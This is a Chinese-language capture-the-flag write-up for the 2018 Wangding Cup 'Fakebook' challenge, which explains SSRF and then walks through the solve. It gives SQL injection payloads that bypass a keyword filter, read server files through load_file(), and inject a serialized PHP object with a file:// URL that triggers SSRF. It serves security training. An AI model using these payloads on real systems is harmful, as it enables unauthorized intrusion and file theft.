# [网鼎杯 2018]Fakebook 1

## SSRF

SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）

SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。

举例 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。

所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。

## WP

用dirsearch扫描,得到user.php.bak文件
```php
<?php
 
 
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";
 
    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }
 
    function get($url)
    {
        $ch = curl_init();
 
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);
 
        return $output;
    }                                                                    //这部分可能存在ssrf
 
    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }
 
    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
 
} 
```
有一个UserInfo的类,类中有三个公共的类变量：name,age,blog。一个构造方法，一个get方法。主要的工作应该是建立会话，

然后判断是否是有效的请求，如果不是则返回404，如果不是则返回url的内容，一个getBlogContents方法，返回一个url的内容

还有一个isValidBlog验证这是否是一个有效的blog地址

get方法中，curl_exec()如果使用不当就会导致ssrf漏洞。有一点思路了，而我们扫到了flag.php。猜测可能flag.php处于内网，

如果用ssrf访问flag.php，可以用伪协议file://var/www/html/flag.php访问。

我们先回到首页，点join注册一个账号

在url中,发现no这个地方可以注入
```sql
no=1 order by 4#                                      //没事
no=1 order by 5#                                      //报错,有4列
no=-1 union/**/select 1,2,3,4#                        //发现过滤了union select,可以用过union/**/select绕过,用/**/代替空格
```
回显位是username,然后还发现了一下错误信息，/var/www/html/view.php刚才扫目录得知flag.php也在这个目录中。

然后我们开始查数据库和数据库信息
```sql
?no=-1 union/**/select 1,database(),3,4--+              //数据库名
?no=-1 union/**/select 1,user(),3,4--+　　　　            //数据库信息
```
发现居然是root权限，那我们知道有一个load_file()函数可以利用绝对路径去加载一个文件，于是我们利用一下

load_file(file_name):file_name是一个完整的路径，于是我们直接用var/www/html/flag.php路径去访问一下这个文件
```sql
?no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4--+
```
得到了flag,换一种方法
```sql
?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()--+    //爆数据库表
?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'--+        //爆字段名
```
这里面no，username,password我们都知道是什么，就data有点猫腻，于是我们查看它一下，于是我们爆data内容：
```sql
?no=-1 union/**/select 1,group_concat(data),3,4 from users
```
`O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:3;s:4:"blog";s:8:"123.blog";}`

这个data本来回显的是我们自己的博客，但我们把它改为回显flag.php就可以构成ssrf
```txt
O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```
data字段在第4位，所以放在第4位。

构造payload
```payload
?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```
查看页面源代码，base64解码也可得到flag

